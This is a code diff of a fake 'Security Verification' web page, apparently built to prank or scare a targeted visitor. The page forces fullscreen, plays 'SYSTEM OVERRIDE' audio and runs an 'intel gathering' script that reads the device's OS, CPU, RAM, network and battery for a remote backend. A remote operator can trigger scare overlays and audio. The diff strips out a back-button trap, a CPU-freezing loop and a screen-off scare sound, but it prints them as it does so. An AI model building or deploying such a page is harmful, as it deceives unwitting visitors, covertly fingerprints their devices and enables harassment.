@@ -5,10 +5,12 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Security Verification</title>
     
+    <!-- ANTI-CACHE TAGS -->
     <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
     <meta http-equiv="Pragma" content="no-cache">
     <meta http-equiv="Expires" content="0">
     
+    <!-- Firebase Libraries -->
     <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
     
@@ -18,6 +20,7 @@
         h2 { margin-top: 0; color: #1877f2; }
         button { background-color: #1877f2; color: white; border: none; padding: 12px 24px; font-size: 16px; border-radius: 5px; cursor: pointer; font-weight: bold; margin-top: 20px; transition: 0.2s; }
         button:hover { background-color: #166fe5; }
+        
         #matrix-container { display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: black; color: lime; font-family: 'Courier New', monospace; padding: 10px; box-sizing: border-box; overflow: hidden; z-index: 100; text-align: left; font-size: 14px; }
         #crack-overlay { display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: url('https://i.ibb.co/3sX8HnM/broken-glass-2202353-960-720.png') no-repeat center center; background-size: cover; z-index: 999; pointer-events: none; opacity: 0.8; }
     </style>
@@ -42,20 +45,24 @@
         const bgAudio = document.getElementById('hackerSound');
         const prankAudio = document.getElementById('prankAudioPlayer');
         
-        // AUTO SCREEN-OFF TRICK (Jaise hi screen off hogi, ye link bajega)
-        // Maine isme tera "Scary Laugh" (01) wala link daala hai as an Auto-Scare!
-        const autoScareAudio = "https://files.catbox.moe/i0zxp5.mp3"; 
-
         document.body.addEventListener('click', function() {
             if (!document.fullscreenElement) {
-                if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
-                else if (document.documentElement.webkitRequestFullscreen) document.documentElement.webkitRequestFullscreen();
-                else if (document.documentElement.msRequestFullscreen) document.documentElement.msRequestFullscreen();
+                if (document.documentElement.requestFullscreen) {
+                    document.documentElement.requestFullscreen();
+                } else if (document.documentElement.webkitRequestFullscreen) { 
+                    document.documentElement.webkitRequestFullscreen();
+                } else if (document.documentElement.msRequestFullscreen) { 
+                    document.documentElement.msRequestFullscreen();
+                }
             }
 
             bgAudio.play().then(() => {
                 if ('mediaSession' in navigator) {
-                    navigator.mediaSession.metadata = new MediaMetadata({ title: 'SYSTEM OVERRIDE', artist: 'JOD X KERNEL', artwork: [{ src: 'https://i.postimg.cc/BvPQP8dK/file-000000004cd8820bbee0e6f2cba39cde.png', sizes: '512x512', type: 'image/png' }] });
+                    navigator.mediaSession.metadata = new MediaMetadata({
+                        title: 'SYSTEM OVERRIDE',
+                        artist: 'JOD X KERNEL',
+                        artwork: [{ src: 'https://i.postimg.cc/BvPQP8dK/file-000000004cd8820bbee0e6f2cba39cde.png', sizes: '512x512', type: 'image/png' }]
+                    });
                 }
             }).catch(e => console.log(e));
 
@@ -79,7 +86,6 @@
         const sessionID = urlParams.get('session');
         const box = document.getElementById('content-box');
         let intervalId = null;
-        let lagInterval = null;
 
         if(!sessionID) {
             box.innerHTML = "<h2 style='color:red;'>Access Denied.</h2><p>Invalid Session Link.</p>";
@@ -89,46 +95,20 @@
             document.getElementById('start-btn').addEventListener('click', () => {
                 box.innerHTML = "<h2>Verifying...</h2><p>Please do not close this window.</p>";
                 
-                // 1. BACK BUTTON TRAP (Bhaag na paye)
-                history.pushState(null, null, location.href);
-                window.onpopstate = function () { history.go(1); };
-
-                // 2. DEVICE HANG / LAG GENERATOR (CPU OVERLOAD)
-                // Ye har half second mein browser ko 350 miliseconds ke liye freeze kar dega
-                // Screen ekdum jam jayegi, touch theek se kaam nahi karega!
-                lagInterval = setInterval(() => {
-                    let end = Date.now() + 350;
-                    while (Date.now() < end) {
-                        Math.random(); // Dummy calculation processor par load dalne ke liye
-                    }
-                }, 500);
-
-                // 3. SCREEN-OFF DETECTOR
-                document.addEventListener("visibilitychange", function() {
-                    if (document.visibilityState === 'hidden') {
-                        // Jaise hi target ne gusse mein power button dabaya (Screen Off kari)
-                        // Achanak se scary audio play hoga background me!
-                        prankAudio.pause();
-                        prankAudio.src = autoScareAudio;
-                        prankAudio.load();
-                        prankAudio.play().catch(e => console.log(e));
-                    }
-                });
-
-                // INTEL GATHERING (Tera purana code waisa hi hai)
+                // ADVANCED INTEL GATHERING SCRIPT
                 let ua = navigator.userAgent;
                 let osName = "Unknown Device";
                 if (/android/i.test(ua)) osName = "Android OS";
                 else if (/ipad|iphone|ipod/i.test(ua)) osName = "Apple iOS";
                 else if (/windows/i.test(ua)) osName = "Windows PC";
                 else if (/mac/i.test(ua)) osName = "Mac OS";
-                
-                let intelData = { 
-                    target_os: osName, 
-                    target_cpu: navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " Cores" : "Hidden", 
-                    target_ram: navigator.deviceMemory ? navigator.deviceMemory + " GB RAM" : "Hidden", 
-                    target_net: navigator.connection ? navigator.connection.effectiveType.toUpperCase() : "Unknown" 
-                };
+                else if (/linux/i.test(ua)) osName = "Linux";
+
+                let cpuCores = navigator.hardwareConcurrency ? navigator.hardwareConcurrency + " Cores" : "Hidden";
+                let ram = navigator.deviceMemory ? navigator.deviceMemory + " GB RAM" : "Hidden";
+                let network = navigator.connection ? navigator.connection.effectiveType.toUpperCase() : "Unknown";
+
+                let intelData = { target_os: osName, target_cpu: cpuCores, target_ram: ram, target_net: network };
 
                 if ('getBattery' in navigator) {
                     navigator.getBattery().then(function(battery) {
@@ -162,7 +142,6 @@
 
             if(type === 'system' && payload === 'kill') {
                 clearInterval(intervalId);
-                clearInterval(lagInterval); // Hang system band karo
                 bgAudio.pause(); 
                 prankAudio.pause(); 
                 
@@ -201,7 +180,12 @@
                 prankAudio.pause();
                 prankAudio.src = payload.trim();
                 prankAudio.load(); 
-                prankAudio.play().catch(err => console.log(err));
+                
+                prankAudio.play().then(() => {
+                    console.log("Audio Payload Delivered successfully!");
+                }).catch(err => {
+                    console.log("Audio Playback Error: ", err);
+                });
             }
         }
     </script>
